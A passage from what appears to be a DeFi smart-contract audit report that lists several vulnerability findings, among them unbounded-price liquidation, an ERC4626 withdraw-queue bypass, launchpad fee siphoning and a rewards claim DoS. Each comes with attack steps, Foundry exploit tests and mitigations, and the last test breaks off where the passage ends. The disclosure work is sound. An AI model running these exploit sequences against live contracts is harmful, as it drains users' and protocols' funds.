Because MarketLib.liquidate submits an IOC reduce-only order with limitPrice=0, the liquidation taker accepts any opposing price. An adversary can pre-place a resting order at an extreme price (e.g., 1 tick) on a thin book and become the sole counterparty to the forced close. For a long liquidation, the IOC SELL fully crosses the bid at the attacker’s low price, driving realized PnL ≈ -openNotional on the closed portion. LiquidatorPanel then converts the negative closing margin into an InsuranceFund.claim(), causing immediate, direct protocol loss while the attacker later unwinds at fair prices to realize profit. This is repeatable across assets/users whenever book depth is shallow.

## Proof of Concept
Attack outline (standard-book liquidation):

- Setup: Victim has a long position near liquidation. Liquidator transactions are publicly observable; the liquidation path uses MarketLib.liquidate which calls CLOBLib.placeOrder with tif=TiF.IOC, reduceOnly=true, limitPrice=0, expiryTime=0.
- Step 1 (attacker prepares): Post a resting bid of sufficient size at an extreme low price (e.g., 1 tick) on the standard book. BookLib.assertPriceInBounds allows tiny non-zero prices (only enforces tick divisibility). For maker orders (tif<=1) zero is disallowed, but near-zero is permitted.
- Step 2 (liquidation executes): A legitimate liquidator calls LiquidatorPanel.liquidate. Because the IOC SELL has limitPrice=0, CLOBLib treats it as willing to cross any bid price. If the bid book is thin or empty except the attacker’s resting bid, the entire close fills at the attacker’s low price.
- Step 3 (accounting): PositionLib.processTrade computes rpnl based on quoteTraded vs closedOpenNotional. With near-zero quoteTraded, rpnl ≈ -closedOpenNotional; cache.margin becomes deeply negative. ClearingHouseLib.rebalanceClose returns margin unchanged for a full close with intendedMargin==0. LiquidatorPanel then executes the full-close underwater branch: fee += cache.margin (fee becomes negative) and margin is deleted, followed by InsuranceFund.claim(abs(fee)).
- Step 4 (profit): The attacker now holds cheaply acquired exposure and can unwind at fair prices, pocketing the price gap times size (minus negligible taker fees from the tiny quote). The Insurance Fund suffers immediate, direct outflow.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Position} from "contracts/perps/types/Position.sol";
import {PositionLib} from "contracts/perps/types/Position.sol";
import {PositionUpdateResult} from "contracts/perps/types/Structs.sol";
import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";
import {SafeCastLib} from "@solady/utils/SafeCastLib.sol";

contract LiquidationIOCUnboundedPriceTest is Test {
    using PositionLib for Position;
    using FixedPointMathLib for uint256;
    using SafeCastLib for *;

    // Demonstrates that an extreme (attacker-forced) low execution price during a forced close
    // drives rpnl deeply negative and forces bad-debt realization consistent with LiquidatorPanel.liquidate logic.
    function test_UnboundedIOCPriceCreatesBadDebt() public {
        // Victim long position to be force-closed
        Position memory pos;
        pos.isLong = true;
        pos.amount = 10e18;          // base size
        pos.openNotional = 1000e18;  // quote paid when opening
        pos.leverage = 10e18;        // 10x

        // Margin before liquidation (arbitrary positive)
        int256 margin = int256(80e18);

        // Forced close fills entire base at near-zero quote (attacker's low bid wins)
        uint256 baseTraded = pos.amount; // full close
        uint256 quoteTraded = 1;         // ~0 price

        PositionUpdateResult memory r = pos.processTrade({
            side: PositionLib.Side.SELL,
            quoteTraded: quoteTraded,
            baseTraded: baseTraded
        });

        // For a long close: rpnl = currentNotional - closedOpenNotional ~ 1 - 1000e18 -> large negative
        assertLt(r.rpnl, 0);

        // Liquidation fee is proportional to quoteTraded; with ~0 quote, fee ~ 0
        uint256 liqFeeRate = 5e16; // 5%
        int256 fee = int256(quoteTraded.fullMulDiv(liqFeeRate, 1e18));

        // LiquidatorPanel settles: margin += rpnl - fee
        margin = margin + r.rpnl - fee;
        assertLt(margin, 0); // underwater after fill at extreme low price

        // In full-close underwater branch, LiquidatorPanel converts negative margin to InsuranceFund.claim()
        uint256 badDebt = uint256(-margin);
        assertGt(badDebt, 0);
    }
}


## Suggested Mitigation
Do not submit liquidation IOC orders with unbounded price. In MarketLib.liquidate (and any liquidation path), derive a side-dependent price guard from a trustworthy reference (mark/index/TWAP) plus a configurable slippage cap. Example: for long liquidation (SELL) set minAcceptable = markPrice * (1 - maxLiqSlippageBps), and pass limitPrice = minAcceptable; for short liquidation (BUY) set maxAcceptable = markPrice * (1 + maxLiqSlippageBps) and use that as the taker cap. Also set a non-zero expiryTime (e.g., block.timestamp) to avoid stale execution. Optionally, harden CLOBLib.placeOrder by rejecting limitPrice==0 for IOC reduce-only orders to prevent accidental unbounded market orders, but the primary fix is bounding liquidation prices against a reference and slippage config.





 **Derived From** : ERC4626 withdraw/redeem left enabled; queued withdrawals can be bypassed

## [M-6]. Queued-withdrawal model bypass: anyone with shares can call ERC4626 withdraw/redeem and redeem instantly 

## Derived From Pattern/Invariant
ERC4626 withdraw/redeem left enabled; queued withdrawals can be bypassed

## Exploit Type
AccessControl

## Location
GTL.withdraw/redeem (inherited ERC4626)

## Minimim Privilege Required
Permissionless

## Description
GTL intends to enforce an admin-only, batched withdrawal flow via processWithdrawals(uint256) with role gating. However, GTL does not override or restrict ERC4626's withdraw/redeem functions, leaving them publicly callable by any share holder. The attempted disable via previewWithdraw/maxWithdraw/maxRedeem returning 0 is ineffective because ERC4626 does not enforce these helpers during execution; it uses convertToShares/convertToAssets internally. As a result, share holders can ignore the queue and withdraw instantly up to their pro-rata of the on-chain USDC liquidity, front-running or starving queued requests. Relevant snippets: GTL.processWithdrawals is onlyAdmin and transfers queued assets; but GTL.previewWithdraw/maxWithdraw/maxRedeem all return 0 and GTL does not override ERC4626 withdraw/redeem.

## Impact
Any share holder can bypass the intended queue and immediately withdraw their pro-rata of on-chain USDC, defeating fairness controls. This enables front-running/priority withdrawal and can temporarily starve the queued-withdrawal pipeline until admins intervene.

## Proof of Concept
1) Attacker and victim both deposit USDC into GTL via ERC4626 deposit. 2) Victim follows intended flow and calls queueWithdrawal(shares). 3) Attacker observes maxWithdraw/maxRedeem return 0 but calls ERC4626.withdraw(assets, attacker, attacker) directly and receives USDC immediately. 4) Victim remains queued while attacker front-runs the available on-chain USDC, demonstrating the queue can be bypassed permissionlessly.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {GTL} from "contracts/perps/GTL.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    uint8 private immutable _decimals;
    constructor(uint8 d) ERC20("USDC", "USDC") { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockViewPort {
    function getFreeCollateralBalance(address) external pure returns (uint256) { return 0; }
    function getOrderbookCollateral(address, uint256) external pure returns (uint256) { return 0; }
    function getAccountValue(address, uint256) external pure returns (int256) { return 0; }
}

contract GTLWithdrawBypassTest is Test {
    MockUSDC usdc;
    GTL gtl;
    MockViewPort vp;

    address owner = address(0xA11CE);
    address attacker = address(0xBEEF);
    address victim = address(0xC0FFEE);

    function setUp() public {
        usdc = new MockUSDC(6);
        vp = new MockViewPort();
        gtl = new GTL(address(usdc), address(vp));

        vm.prank(owner);
        gtl.initialize(owner);

        usdc.mint(attacker, 1_000_000e6);
        usdc.mint(victim, 1_000_000e6);

        vm.prank(attacker);
        usdc.approve(address(gtl), type(uint256).max);
        vm.prank(victim);
        usdc.approve(address(gtl), type(uint256).max);

        vm.prank(attacker);
        gtl.deposit(500e6, attacker);
        vm.prank(victim);
        gtl.deposit(500e6, victim);
    }

    function test_BypassQueuedWithdrawals_via_ERC4626Withdraw() public {
        // Victim follows intended queue path
        vm.prank(victim);
        uint256 vShares = gtl.balanceOf(victim);
        gtl.queueWithdrawal(vShares);

        // Protocol tries to signal "disabled" withdraw/redeem via views
        assertEq(gtl.maxWithdraw(attacker), 0);
        assertEq(gtl.maxRedeem(attacker), 0);

        // Attacker bypasses queue with ERC4626.withdraw and gets paid immediately
        uint256 balBefore = usdc.balanceOf(attacker);
        vm.prank(attacker);
        gtl.withdraw(100e6, attacker, attacker);
        assertEq(usdc.balanceOf(attacker), balBefore + 100e6);

        // Victim remains queued; shares still locked in queue
        assertEq(gtl.getQueuedShares(victim), vShares);
    }
}


## Suggested Mitigation
Explicitly override ERC4626 withdraw/redeem to enforce the queue/role policy. Example: function withdraw(...) public override returns (uint256) { revert Unused(); } and same for redeem. Alternatively, gate them with onlyAdmin or a global flag that permanently disables direct 4626 withdrawals, and provide a public view that communicates that immediate withdraws are not supported.





 **Derived From** : price0CumulativeLast_post >= price0CumulativeLast_pre && price1CumulativeLast_post >= price1CumulativeLast_pre

## [M-7]. Same-timestamp burn siphons undistributed launchpad fees due to timeElapsed gate in _update (fee misallocation to attacker LP) 

## Derived From Pattern/Invariant
price0CumulativeLast_post >= price0CumulativeLast_pre && price1CumulativeLast_post >= price1CumulativeLast_pre

## Exploit Type
TimestampDependentLogic

## Location
GTELaunchpadV2Pair.swap,burn,_update

## Minimim Privilege Required
Permissionless

## Description
GTELaunchpadV2Pair delays fee distribution to the Distributor when timeElapsed == 0 in _update. In that branch, new fees are only stored in accruedLaunchpadFee{i}, while reserves are set to uint112(balance{i}) - totalLaunchpadFee{i}. Because burn() computes redemption from raw balances (not reserves), an attacker holding LP can perform a swap to generate launchpad fees and, in the same timestamp, immediately burn LP to receive a pro-rata share of those undistributed fees. Later, when timeElapsed > 0, _update will distribute the full accrued fees to the Distributor, meaning the attacker’s earlier take comes out of other LPs’ pool value (misallocation). Vulnerable snippet: else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) { accruedLaunchpadFee0 = totalLaunchpadFee0; accruedLaunchpadFee1 = totalLaunchpadFee1; } ... reserve0 = _reserve0 = uint112(balance0) - totalLaunchpadFee0; reserve1 = _reserve1 = uint112(balance1) - totalLaunchpadFee1; In contrast, burn() calculates amount0/1 from balance0/1 (which still includes the undistributed fees). This temporal window lets an LP front-run fee distribution and extract a share of fees.

## Impact
An LP can siphon a pro‑rata share of newly accrued launchpad fees before they are distributed by triggering a same-timestamp swap (to accrue fees) followed by an immediate burn. Later, when timeElapsed > 0, the pair distributes the full fee amount, effectively charging the attacker’s earlier skim against reserves (other LPs), reducing their redeemable value. This is repeatable per block and leads to ongoing misallocation that requires protocol intervention to compensate affected LPs.

## Proof of Concept
Attack outline (single transaction, same block):
- Preconditions: launchpadFeeDistributor is set; launchpadLp holds a non-trivial LP balance so _getLaunchpadFees() > 0.
- Step 1: Attacker calls pair.sync() to set blockTimestampLast = current block timestamp.
- Step 2: In the same transaction (same block), attacker performs a swap that yields amount0In/amount1In > 0. Inside swap → _update runs with timeElapsed == 0 so it accrues new fees (accruedLaunchpadFee{i} = totalLaunchpadFee{i}) and subtracts total fees from reserves, but does not distribute.
- Step 3: Still in the same transaction, attacker transfers a portion of their LP to the pair and calls burn(). burn() computes amount0/amount1 from raw balances, which still include the accrued (undistributed) fees, so the attacker receives a pro‑rata share of those fees.
- Step 4: In a later call when timeElapsed > 0 (e.g., a subsequent sync/swap in a later block), _update distributes the full accruedLaunchpadFee{i} to the Distributor. Because part of those tokens were already withdrawn by the attacker via burn, the shortfall is implicitly taken from reserves (hurting remaining LPs). Repeating this sequence per block skims a share of fees before distribution.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amt) external returns (bool);
    function transferFrom(address from,address to,uint256 amt) external returns (bool);
    function approve(address to, uint256 amt) external returns (bool);
}

contract ERC20Mock is IERC20Minimal {
    string public name; string public symbol; uint8 public constant decimals = 18;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n,string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external { balanceOf[to]+=amt; }
    function transfer(address to,uint256 amt) external override returns(bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from,address to,uint256 amt) external override returns(bool){ uint256 a=allowance[from][msg.sender]; require(a>=amt,"allow"); allowance[from][msg.sender]=a-amt; require(balanceOf[from]>=amt,"bal"); balanceOf[from]-=amt; balanceOf[to]+=amt; return true; }
    function approve(address to,uint256 amt) external override returns(bool){ allowance[msg.sender][to]=amt; return true; }
}

contract DistributorMock {
    // Pulls tokens using transferFrom when pair approves
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external {
        if (a0>0) IERC20Minimal(t0).transferFrom(msg.sender, address(this), a0);
        if (a1>0) IERC20Minimal(t1).transferFrom(msg.sender, address(this), a1);
    }
}

contract FactoryMock {
    address public feeToAddress;
    function feeTo() external view returns (address) { return feeToAddress; }
    function setFeeTo(address a) external { feeToAddress = a; }
    function deployPair(address t0,address t1,address lp,address dist) external returns (GTELaunchpadV2Pair) {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(t0,t1,lp,dist); // msg.sender here is FactoryMock (matches constructor factory=msg.sender)
        return p;
    }
}

contract TemporalFeeLeakTest is Test {
    ERC20Mock t0; ERC20Mock t1; DistributorMock dist; FactoryMock fac;
    address attacker = address(0xA11CE);
    address victimLp = address(0xB0B15);

    function setUp() public {
        t0 = new ERC20Mock("T0","T0");
        t1 = new ERC20Mock("T1","T1");
        dist = new DistributorMock();
        fac = new FactoryMock();
        // seed balances
        t0.mint(attacker, 2_000_000 ether);
        t1.mint(attacker, 2_000_000 ether);
        t0.mint(victimLp, 20_000_000 ether);
        t1.mint(victimLp, 20_000_000 ether);
    }

    function _initPair(address launchpadLp) internal returns (GTELaunchpadV2Pair p) {
        p = fac.deployPair(address(t0), address(t1), launchpadLp, address(dist));
        // Victim LP provides majority liquidity (will also be the launchpadLp so fees accrue)
        vm.startPrank(victimLp);
        t0.transfer(address(p), 10_000_000 ether);
        t1.transfer(address(p), 10_000_000 ether);
        p.mint(victimLp);
        vm.stopPrank();
        // Attacker provides minority liquidity
        vm.startPrank(attacker);
        t0.transfer(address(p), 1_000_000 ether);
        t1.transfer(address(p), 1_000_000 ether);
        p.mint(attacker);
        vm.stopPrank();
        // Sync to set blockTimestampLast
        vm.warp(1000);
        p.sync();
    }

    function _attackerSwapCreateFees(GTELaunchpadV2Pair p,uint256 amtIn0,uint256 amtOut1) internal {
        vm.startPrank(attacker);
        t0.transfer(address(p), amtIn0);
        // choose a safe amount1Out under invariant (pool is deep)
        p.swap(0, amtOut1, attacker, bytes(""));
        vm.stopPrank();
    }

    function test_SameTimestampBurnStealsUndistributedFees() public {
        // Attack scenario: launchpadLp holds majority LP so _getLaunchpadFees() > 0
        GTELaunchpadV2Pair p1 = _initPair(victimLp);
        vm.warp(2000);
        p1.sync(); // set blockTimestampLast = current
        // In the SAME timestamp: swap accrues fees (no distribution) then burn
        _attackerSwapCreateFees(p1, 100_000 ether, 80_000 ether);
        uint256 attackerLp1 = p1.balanceOf(attacker);
        vm.startPrank(attacker);
        p1.transfer(address(p1), attackerLp1/10); // burn 10% of attacker's LP
        (uint256 a0_now, uint256 a1_now) = p1.burn(attacker);
        vm.stopPrank();

        // Baseline: identical actions but let time pass so distribution happens before burn
        GTELaunchpadV2Pair p2 = _initPair(victimLp);
        vm.warp(3000);
        p2.sync();
        _attackerSwapCreateFees(p2, 100_000 ether, 80_000 ether);
        vm.warp(3001); // force timeElapsed > 0
        p2.sync();      // distributes accrued fees to Distributor
        uint256 attackerLp2 = p2.balanceOf(attacker);
        vm.startPrank(attacker);
        p2.transfer(address(p2), attackerLp2/10);
        (uint256 a0_base, uint256 a1_base) = p2.burn(attacker);
        vm.stopPrank();

        // Attacker receives more when burning in the same timestamp (captures fee share)
        assertGt(a0_now + a1_now, a0_base + a1_base);
    }
}


## Suggested Mitigation
Remove the temporal window by excluding undistributed fees from pro‑rata mint/burn math, or by distributing fees regardless of timeElapsed:
- Safer change (minimal): In burn() and mint(), compute with net balances that exclude totalLaunchpadFee{i}. For burn(), use balance{i}_net = IERC20(token{i}).balanceOf(address(this)) - accruedLaunchpadFee{i}; then amount{i} = liquidity * balance{i}_net / totalSupply. For mint(), compute amount{i} from (balance{i} - accruedLaunchpadFee{i}) - _reserve{i}.
- Alternative: Move fee distribution outside the timeElapsed gate in _update. If (launchpadFeeDistributor != address(0) && (totalLaunchpadFee0|totalLaunchpadFee1)>0), delete accrued and _distributeLaunchpadFees(...) even when timeElapsed == 0, then set reserves from the post-distribution balances (or set totalLaunchpadFee{i} to 0 before subtracting). This ensures fees are never included in balances used by burn/mint.
Also ensure _update’s reserve assignment always reflects balances net of any undistributed fees so no pro‑rata operation can include them.





 **Derived From** : Zero-priced trades due to integer-flooring (no min-amount guard)

## [L-8]. Free base via zero-quote rounding in SimpleBondingCurve.buy drains bonding inventory

## Derived From Pattern/Invariant
Zero-priced trades due to integer-flooring (no min-amount guard)

## Exploit Type
RoundingError

## Location
SimpleBondingCurve.buy

## Minimim Privilege Required
Permissionless

## Description
SimpleBondingCurve uses floor division to quote prices and does not enforce non-zero outputs. In buy(), quoteAmount = (quoteReserve * baseAmount) / (baseReserve - baseAmount) can floor to 0 for tiny baseAmount. Despite a 0 quote, reserves are still updated: r.quoteReserve += 0; r.baseReserve -= baseAmount. If the Launchpad accepts such trades (e.g., maxQuote >= 0), an attacker can repeatedly buy dust-size base for zero quote, permanently reducing baseReserve (the curve’s inventory) without paying. Vulnerable snippet:

function buy(address token, uint256 baseAmount) external onlyLaunchpad returns (uint256 quoteAmount) {
    Reserves storage r = reserves[token];
    quoteAmount = _getQuoteAmount(baseAmount, r.quoteReserve, r.baseReserve, true);
    r.quoteReserve += quoteAmount; // 0 when rounded
    r.baseReserve -= baseAmount;   // reduced even if quoteAmount == 0
}

function _getQuoteAmount(uint256 baseAmount, uint256 quoteReserve, uint256 baseReserve, bool isBuy) internal pure returns (uint256) {
    uint256 baseReserveAfter = isBuy ? baseReserve - baseAmount : baseReserve + baseAmount;
    return (quoteReserve * baseAmount) / baseReserveAfter; // floors
}

## Impact
Due to integer flooring in buy(), a user can request extremely small base amounts that compute to quoteAmount == 0, while reserves still update and baseReserve decreases. However, because only the Launchpad can call buy(), exploitability depends on whether Launchpad enforces min-amount checks. Even without such checks, each free acquisition is just dust (often 1 wei) and requires an infeasible number of calls to accumulate a meaningful balance. This results in at most a griefing-level, microscopic inventory leakage rather than a practical drain.

## Proof of Concept
Preconditions: Launchpad (or Router → Launchpad) accepts tiny buys without enforcing quoteAmount > 0 or a minimum trade size.
Steps:
1) Attacker calls the Launchpad buy route for a launched token with outBase = 1 wei and any maxQuote ≥ 0.
2) SimpleBondingCurve.buy computes quoteAmount = floor(quoteReserve * baseAmount / (baseReserve - baseAmount)). With typical launch parameters (e.g., VIRTUAL_BASE ≈ 1e18, VIRTUAL_QUOTE ≈ 1e18, bondingSupply ≈ 8e26 wei), the numerator is ≈ 1e18 while the denominator is ≫ 1e18, so quoteAmount floors to 0.
3) Reserves mutate even when quoteAmount == 0: r.quoteReserve += 0 (unchanged), r.baseReserve -= 1. Launchpad transfers 0 quote from attacker and still dispenses 1 wei of base.
4) The attacker can repeat to obtain dust base for free. Practical impact remains negligible: quote becomes non-zero only after reducing baseReserve down near quoteReserve, which would take an infeasible number of calls.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";

contract MockLaunchpad {
    SimpleBondingCurve public curve;
    constructor() {}
    function setCurve(SimpleBondingCurve _curve) external { require(address(curve)==address(0), "set once"); curve = _curve; }
    function init(bytes memory data) external { curve.init(data); }
    function initializeCurve(address token, uint256 total, uint256 bonding) external { curve.initializeCurve(token, total, bonding); }
    function buy(address token, uint256 base) external returns (uint256) { return curve.buy(token, base); }
    function sell(address token, uint256 base) external returns (uint256) { return curve.sell(token, base); }
    function getReserves(address token) external view returns (uint256, uint256) { return curve.getReserves(token); }
    function baseSoldFromCurve(address token) external view returns (uint256) { return curve.baseSoldFromCurve(token); }
    function quoteBoughtByCurve(address token) external view returns (uint256) { return curve.quoteBoughtByCurve(token); }
}

contract ZeroQuoteBuyTest is Test {
    SimpleBondingCurve curve;
    MockLaunchpad launchpad;
    address token = address(0xBEEF);

    function setUp() public {
        launchpad = new MockLaunchpad();
        curve = new SimpleBondingCurve(address(launchpad));
        launchpad.setCurve(curve);
        // Use realistic symmetric virtual reserves
        bytes memory data = abi.encode(uint256(1e18), uint256(1e18)); // VIRTUAL_BASE=1e18, VIRTUAL_QUOTE=1e18
        launchpad.init(data);
        uint256 bonding = 1_000 * 1e18; // 1000 tokens with 18 decimals
        uint256 total = 1_000 * 1e18;
        launchpad.initializeCurve(token, total, bonding);
    }

    function test_zeroQuoteDustBuys() public {
        (uint256 qBefore, uint256 bBefore) = launchpad.getReserves(token);
        assertEq(qBefore, 1e18, "VQ");
        assertEq(bBefore, (1_000 * 1e18) + 1e18, "bonding + VB");

        // Dust buy should cost 0 quote but still reduce base reserve
        uint256 quotePaid = launchpad.buy(token, 1);
        assertEq(quotePaid, 0, "rounded to zero quote");
        (uint256 qAfter, uint256 bAfter) = launchpad.getReserves(token);
        assertEq(qAfter, qBefore, "no quote added");
        assertEq(bAfter, bBefore - 1, "base decreased for free");

        // Repeat a few times
        for (uint256 i = 0; i < 10; i++) {
            uint256 q = launchpad.buy(token, 1);
            assertEq(q, 0, "still zero-quote");
        }
        (uint256 q2, uint256 b2) = launchpad.getReserves(token);
        assertEq(q2, 1e18, "quote unchanged");
        assertEq(b2, bBefore - 11, "11 wei drained from base reserve");

        // Accounting drift: base sold increases while quote bought does not
        assertGt(launchpad.baseSoldFromCurve(token), 0, "base sold grew");
        assertEq(launchpad.quoteBoughtByCurve(token), 0, "no quote collected");
    }
}


## Suggested Mitigation
Adopt one or more of the following: (a) Round required quote up on buys to avoid underpayment: quoteAmount = Math.ceilDiv(quoteReserve * baseAmount, baseReserve - baseAmount), and similarly ensure rounding directions always favor the curve for required-in amounts; (b) Enforce non-zero outputs and minimum trade sizes at both the curve and Launchpad levels: require(baseAmount >= MIN_BASE && quoteAmount > 0) in buy(), and require(quoteAmount > 0) in sell(); (c) At the Launchpad entrypoint, reject orders where computed in/out is zero, or apply a protocol-level minBase/minQuote per market to prevent dust trades.





 **Derived From** : On success: getRewardsPoolData(launchAsset).quoteAsset == quoteAsset and getRewardsPoolData(quoteAsset).quoteAsset == address(0); any subsequent createRewardsPair using either asset reverts

## [M-9]. Pool-aliasing via mismatched addRewards breaks state machine and DoS’s claims for a pair 

## Derived From Pattern/Invariant
On success: getRewardsPoolData(launchAsset).quoteAsset == quoteAsset and getRewardsPoolData(quoteAsset).quoteAsset == address(0); any subsequent createRewardsPair using either asset reverts

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.createRewardsPair

## Minimim Privilege Required
Permissionless

## Description
createRewardsPair enforces a one-time mapping per launchAsset (and blocks reversed-duplicate), but the system still allows aliasing during addRewards because the function does not validate that the caller-supplied quoteAsset matches the stored rs.quoteAsset for the chosen launchAsset. An attacker can target any existing pool (launchAsset = X, stored quoteAsset = Y) by calling addRewards(token0=G, token1=X, amount0>0, amount1=0) with an arbitrary token G != Y. Orientation detection picks token1 (X) as the pool base (since rs(token1).quoteAsset != 0) and proceeds to: (1) bump rs.pendingQuoteRewards for X’s pool, (2) increase totalPendingRewards[G], and (3) transfer G into the Distributor. Later, claimRewards(X) computes a positive quoteAmount and _distributeAssets tries to pay out in the stored quote (Y), calling _decreaseTotalPending(Y, quoteAmount). Because totalPendingRewards[Y] was never increased (only G was), this reverts with ClaimAmountExceedsTotalPendingRewards, DoS’ing all claims on that pool until admins patch balances. Vulnerable snippets: Distributor.addRewards() lacks a check that quoteAsset argument equals rs.quoteAsset before rs.addQuoteRewards(...), and proceeds to _increaseTotalPending(quoteAsset, ...) and transferFrom(quoteAsset).

## Impact
Permanent claim DoS for the targeted rewards pool (until admin repair) and stranded tokens counted as pending for an unrelated asset. Users cannot withdraw accrued quote incentives; admin cannot skim the mismatched tokens because they are included in totalPendingRewards.

## Proof of Concept
1) Owner initializes Distributor with launchpad = owner. 2) Launchpad creates a pair (X,Y) via createRewardsPair(X,Y). 3) Launchpad stakes any nonzero shares so rs.totalShares > 0. 4) Attacker mints arbitrary ERC20 G and approves Distributor. 5) Attacker calls addRewards(token0=G, token1=X, amount0=1e18, amount1=0). This records pendingQuoteRewards for X’s pool but increases totalPendingRewards[G]. 6) Any user calling claimRewards(X) reverts because _decreaseTotalPending(Y, quoteAmount) fails: totalPendingRewards[Y] is 0. Claims are fully blocked until admins inject Y to cover the mismatch.

## Proof of Code
pragma solidity 0.8.27; import "forge-std/Test.sol"; import {Distributor} from "contracts/launchpad/Distributor.sol"; interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address,uint256) external returns (bool); function transfer(address,uint256) external returns (bool); function transferFrom(address,address,uint256) external returns (bool); } contract MockERC20 is IERC20 { string public name; string public symbol; uint8 public decimals = 18; mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; constructor(string memory n,string memory s){name=n;symbol=s;} function mint(address to,uint256 amt) external { balanceOf[to]+=amt; } function approve(address sp,uint256 amt) external returns(bool){ allowance[msg.sender][sp]=amt; return true; } function transfer(address to,uint256 amt) external returns(bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; } function transferFrom(address f,address t,uint256 a) external returns(bool){ uint256 al=allowance[f][msg.sender]; require(al>=a,"allow"); require(balanceOf[f]>=a,"bal"); allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } } contract Invariant_StateMachine_Aliasing_DoS_Test is Test { Distributor d; MockERC20 X; MockERC20 Y; MockERC20 G; address launchpad; address user; function setUp() public { launchpad = address(this); user = address(0xBEEF); d = new Distributor(); d.initialize(launchpad); X = new MockERC20("X","X"); Y = new MockERC20("Y","Y"); G = new MockERC20("G","G"); // Create rewards pair (X,Y) vm.prank(launchpad); d.createRewardsPair(address(X), address(Y)); // Stake some shares so totalShares>0 vm.prank(launchpad); d.increaseStake(address(X), user, 1); } function test_DoS_claim_via_MismatchedQuoteRewards() public { // Attacker supplies arbitrary token G instead of the stored quote Y G.mint(address(this), 1e18); G.approve(address(d), type(uint256).max); // addRewards(token0=G, token1=X, amount0>0, amount1=0) d.addRewards(address(G), address(X), uint128(1e18), 0); // User tries to claim accrued quote rewards in pool (X,Y) // This should revert because totalPendingRewards[Y]==0 while pendingQuoteRewards>0 vm.prank(user); vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector); d.claimRewards(address(X)); } }

## Suggested Mitigation
Enforce pool orientation and asset matching in addRewards: after selecting the pool (rs) and deriving launchAsset, require(quoteAsset == rs.quoteAsset) when quoteAssetAmount > 0. Alternatively, ignore the caller-supplied quoteAsset entirely and always use rs.quoteAsset for accounting and transfers (i.e., pull tokens from rs.quoteAsset only). Also consider strengthening createRewardsPair policy or documenting that a token may never be the base of one pool and the quote of another to preclude any aliasing risks.





 **Derived From** : Launchpad fee share manipulable by temporary LP mint/burn to reduce fees near-zero

## [L-10]. Launchpad fee siphon can be reduced to near-zero via same-tx temporary LP minting that inflates totalSupply in GTELaunchpadV2Pair._getLaunchpadFees

## Derived From Pattern/Invariant
Launchpad fee share manipulable by temporary LP mint/burn to reduce fees near-zero

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair._getLaunchpadFees

## Minimim Privilege Required
Permissionless

## Description
The launchpad fee uses the instantaneous ratio launchpadLpBal / totalSupply at swap time. Because both totalSupply() and balanceOf(launchpadLp) are fully manipulable intra-transaction through mint/burn, an attacker can temporarily add large liquidity (mint LP), execute a swap, and then burn those LP in the same transaction. The inflated totalSupply in the denominator reduces the computed fee to near-zero, starving rewards. Vulnerable snippet:

function _getLaunchpadFees(uint256 amount0In, uint256 amount1In) internal view returns (uint112 fee0, uint112 fee1) {
    uint256 totalLpBal = this.totalSupply();
    uint256 launchpadLpBal = this.balanceOf(launchpadLp) + MINIMUM_LIQUIDITY;
    if (amount0In > 0) fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
    if (amount1In > 0) fee1 = uint112(amount1In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
}
This is a classic single-tx economic manipulation: fee depends on current LP supply, which the attacker inflates and then removes without lasting capital risk.

## Impact
Because the launchpad fee share is computed from the instantaneous LP supply ratio at swap time, a third party can temporarily mint a large amount of LP in the same transaction before a victim’s swap to dilute the launchpad’s share, then burn it after. This reduces the rewards accrued to the launchpad for that swap but does not create direct profit for the attacker; the fee is taken from LP reserves, not charged to the trader. The attack is repeatable but economically irrational for profit-seeking actors (requires capital/flash liquidity and bears small costs) and primarily enables griefing/temporary revenue suppression.

## Proof of Concept
High-level steps demonstrating revenue suppression via same-tx LP inflation:

1) Initialize a pair with initial liquidity held by launchpadLp so that launchpadLp initially owns nearly 100% of LP shares.
2) Baseline: perform a swap that transfers amount0In via callback (IUniswapV2Callee) and observe the newly accrued launchpad fee (getAccruedLaunchpadFees).
3) Manipulated: in a fresh pair with the same initial liquidity, an attacker temporarily mints a very large amount of LP (balanced token0/token1 deposit), inflating totalSupply. In the same transaction, perform the same swap (same amount0In via callback). Because _getLaunchpadFees uses launchpadLpBal / totalSupply at the time of swap, the computed fee is much smaller. Then, still in the same tx, the attacker transfers their LP back to the pair and calls burn to recover their temporary deposit.
4) Compare accruedLaunchpadFee0 across the two scenarios; the manipulated case is orders of magnitude smaller for the same amount0In.

Note: The launchpad fee is taken from reserves in _update(), harming LPs proportionally at that moment. The attacker does not capture value; they simply reduce what would have gone to the launchpad distributor for that swap.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
